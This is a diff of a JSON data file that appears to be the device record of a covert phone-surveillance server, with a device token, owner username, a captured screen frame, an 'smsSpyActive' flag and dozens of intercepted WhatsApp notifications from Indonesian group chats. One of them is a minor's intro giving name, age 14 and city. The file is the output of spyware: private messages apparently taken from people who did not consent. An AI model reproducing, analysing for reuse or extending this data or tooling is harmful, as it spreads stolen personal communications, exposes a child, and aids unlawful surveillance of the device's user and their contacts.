@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776036882364,
+    "lastSeen": 1776036885335,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -122,14 +122,110 @@
     },
     "lastPhoto": null,
     "lastScreenFrame": {
-      "frameBase64": "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",
+      "frameBase64": "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",
       "width": 216,
       "height": 468,
-      "frameId": 6513,
-      "capturedAt": 1776036884895
+      "frameId": 6524,
+      "capturedAt": 1776036886481
     },
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝗠𝗔𝗥𝗚𝗔 𝟵𝟬𝟴 (108 pesan): ~ .ec",
+        "content": "💟 Stiker",
+        "time": "13/04 06:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776036886733
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝗠𝗔𝗥𝗚𝗔 𝟵𝟬𝟴 (108 pesan): ~ qeelmupp",
+        "content": "Guys @semua",
+        "time": "13/04 06:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776036886343
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝗠𝗔𝗥𝗚𝗔 𝟵𝟬𝟴",
+        "content": "‎108 pesan baru",
+        "time": "13/04 06:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776036886326
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝗠𝗔𝗥𝗚𝗔 𝟵𝟬𝟴 (108 pesan): ~ kyy_stylesupermen",
+        "content": "salken moga betah yo",
+        "time": "13/04 06:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776036885947
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝗠𝗔𝗥𝗚𝗔 𝟵𝟬𝟴 (108 pesan): ~ .ec",
+        "content": "salkenn mek",
+        "time": "13/04 06:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776036885880
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝗠𝗔𝗥𝗚𝗔 𝟵𝟬𝟴",
+        "content": "‎108 pesan baru",
+        "time": "13/04 06:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776036885867
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝗠𝗔𝗥𝗚𝗔 𝟵𝟬𝟴 (108 pesan): ~ rapnyawit🇦🇱",
+        "content": "kartu intro \nnama: rapka \numur:14\naskot: Surabaya",
+        "time": "13/04 06:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776036885686
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝗠𝗔𝗥𝗚𝗔 𝟵𝟬𝟴",
+        "content": "‎108 pesan baru",
+        "time": "13/04 06:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776036885678
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝗠𝗔𝗥𝗚𝗔 𝟵𝟬𝟴",
+        "content": "‎108 pesan baru",
+        "time": "13/04 06:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776036885442
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝗠𝗔𝗥𝗚𝗔 𝟵𝟬𝟴 (108 pesan): ~ kyy_stylesupermen",
+        "content": "salken moga betah yo",
+        "time": "13/04 06:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776036885371
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝗠𝗔𝗥𝗚𝗔 𝟵𝟬𝟴",
+        "content": "‎108 pesan baru",
+        "time": "13/04 06:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776036884976
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝗠𝗔𝗥𝗚𝗔 𝟵𝟬𝟴 (108 pesan): ~ kyy_stylesupermen",
+        "content": "salken moga betah yo",
+        "time": "13/04 06:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776036884917
+      },
       {
         "appName": "WhatsApp",
         "sender": "𝗠𝗔𝗥𝗚𝗔 𝟵𝟬𝟴",
@@ -4033,102 +4129,6 @@
         "time": "12/04 21:21",
         "pkg": "com.whatsapp",
         "receivedAt": 1776003684956
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
-        "content": "‎3 pesan baru",
-        "time": "12/04 21:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776003684267
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
-        "content": "‎3 pesan baru",
-        "time": "12/04 21:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776003683452
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (3 pesan): ~ zaa?",
-        "content": "yaampun 🥰",
-        "time": "12/04 21:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776003683052
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (2 pesan): ~ ~`lova",
-        "content": "awas kalian homobong",
-        "time": "12/04 21:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776003682309
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
-        "content": "‎2 pesan baru",
-        "time": "12/04 21:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776003682047
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
-        "content": "‎2 pesan baru",
-        "time": "12/04 21:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776003681345
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
-        "content": "~ kiwaa inii: INI PADA KENAPACOK",
-        "time": "12/04 21:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776003679218
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨: ~ kiwaa inii",
-        "content": "INI PADA KENAPACOK",
-        "time": "12/04 21:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776003678451
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (9 pesan): ~ 𝒜𝓋𝑒𝓁𝓎𝓃 𝒢𝓇𝒾𝓈𝑒𝓁𝒹𝒶 𝒱𝒶𝓁𝑒𝓇𝓎",
-        "content": "chat lama",
-        "time": "12/04 21:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776003673482
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
-        "content": "‎9 pesan baru",
-        "time": "12/04 21:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776003672932
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (9 pesan): ~ 𝒜𝓋𝑒𝓁𝓎𝓃 𝒢𝓇𝒾𝓈𝑒𝓁𝒹𝒶 𝒱𝒶𝓁𝑒𝓇𝓎",
-        "content": "chat lama",
-        "time": "12/04 21:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776003672595
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
-        "content": "‎9 pesan baru",
-        "time": "12/04 21:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776003672318
       }
     ],
     "galleryPhotos": [],
